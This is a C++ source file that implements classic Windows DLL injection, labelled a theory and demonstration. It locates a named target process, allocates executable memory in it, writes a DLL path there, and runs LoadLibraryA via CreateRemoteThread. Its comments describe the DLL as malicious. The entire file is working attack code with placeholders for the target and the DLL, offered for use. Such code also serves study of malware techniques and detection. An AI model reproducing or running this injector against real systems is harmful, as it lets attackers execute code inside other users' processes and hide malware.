#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
using namespace std;


int main()
{
    printf("[ Process Injection: DLL Injection [Theory and demonstration] ]\n\n");

    const char* psName = "<Write the name of your target process>";
    char dllPath[MAX_PATH] = "<Write fullpath of your dll>";
    DWORD pID = NULL;
    PROCESSENTRY32 pE{};
    pE.dwSize = sizeof(pE);

    // Creating snapshot of all running process to search about the target process
    const HANDLE hpE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    //checking if snapshot is Invalid
    if (hpE == INVALID_HANDLE_VALUE) { printf("ERR : INVALID_HANDLE_VALUE.\n"); return -1; }
    // do-While loop to comapre our target process name with every running prcess
    Process32First(hpE, &pE);
    do {
        //if the target process found update pID with process ID value
        if (_stricmp(pE.szExeFile, psName) == 0) {

            pID = pE.th32ProcessID;

            if (!pID) { printf("ERR : Process Not found.\n"); continue; }
            printf("Traget Process : %s\n", pE.szExeFile);
            printf("Target PID : %i\n\n", (int)pID);
            // STEP 1 : open process handle to be used in rest of our code
            const HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
            if (hP == INVALID_HANDLE_VALUE) { printf("ERR : INVALID_HANDLE_VALUE.\n"); continue; }
            else { printf("[ ! ]  Handle to Taregt Process opened...\n"); }
            // STEP 2 : allocate memory in the tagert process with PAGE_EXECUTE_READWRITE protection 
            const void* rLoc = VirtualAllocEx(hP, nullptr, sizeof dllPath, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!rLoc) { printf("Not Able to allocate memory in the target process.\n"); continue; }
            else { printf("[ ! ]  Memory allocated to Taregt Process...\n"); }
            //  STEP 3 : writes the malicious dll to the Target process's memory
            const DWORD dwWriteResult = WriteProcessMemory(hP, (LPVOID)rLoc, dllPath, lstrlenA(dllPath) + 1, nullptr);
            if (!WriteProcessMemory(hP, (LPVOID)rLoc, dllPath, lstrlenA(dllPath) + 1, nullptr))
            {
                printf("Not able to write the dll to the Taregt process.\n"); continue;
            }
            else
            {
                printf("[ ! ]  DLL Injected...\n");
            }
            // STEP 4 : start a new thread in Target process's that executes the LoadLibrary function which execute the malicious dll that written in memory.
            const HANDLE hT = CreateRemoteThread(hP, nullptr, 0, (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), (LPVOID)rLoc, 0, nullptr);
            if (hT == INVALID_HANDLE_VALUE) { printf("CreateRemoteThread: INVALID_HANDLE_VALUE.\n"); continue; }
            else {
                printf("[ ! ]  Remote Thread Created.\n");
            }

            printf("[ * ] Finished !\n");

            break;
        }
    } while (Process32Next(hpE, &pE));


    return 0;
}
